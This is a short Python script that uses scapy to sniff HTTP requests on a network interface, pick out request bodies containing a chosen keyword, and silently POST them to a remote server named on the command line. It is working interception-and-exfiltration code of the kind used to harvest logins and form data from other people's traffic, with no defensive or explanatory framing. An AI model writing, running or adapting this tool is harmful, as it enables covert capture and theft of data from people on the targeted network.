#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse
import threading
import requests

# Command line arguments
parser = optparse.OptionParser()
parser.add_option('-p', '--port', dest="port", help="Port to sniff on.")
parser.add_option('-i', '--interface', dest="interface", help="Network interface to sniff on.")
parser.add_option('-f', '--filter', dest="filter_keyword", help="A keyword to filter in the packets.")
parser.add_option('-s', '--server', dest="server", help="Server's IP address to send the collected data in HTTP/S.")
parser.add_option('-k', '--server-key', dest="server_key", help="String to be key for communicating with the remote server.")
(options, arguments) = parser.parse_args()

port = "port " + str(options.port)
interface = options.interface
filter_keyword = options.filter_keyword
server = options.server
server_key = options.server_key


# Sniffing the packets with user's arguments
def sniffer(interface, port):
    scapy.sniff(iface=interface, filter=port, prn=pkt_filter)


# Function for passing the packets to multi-thread processing
def pkt_filter(pkt):
    t = threading.Thread(target=pkt_processor, args=(pkt,))
    t.start()

# Filtering the packets using the user's specified keyword
def pkt_processor(pkt):
    if pkt.haslayer(http.HTTPRequest):
            if pkt.haslayer(scapy.Raw):
                payload = str(pkt[scapy.Raw].load)
                if filter_keyword in payload:
                    sendRemote(payload)

# Send the filtered data to the remote server
def sendRemote(data):
    payload_1 = data.split('b\'')[1]
    payload = payload_1[:-1]
    try:
        response = requests.post(server, data={"key": server_key, "payload":payload})
    except:
        pass

sniffer(interface, port)
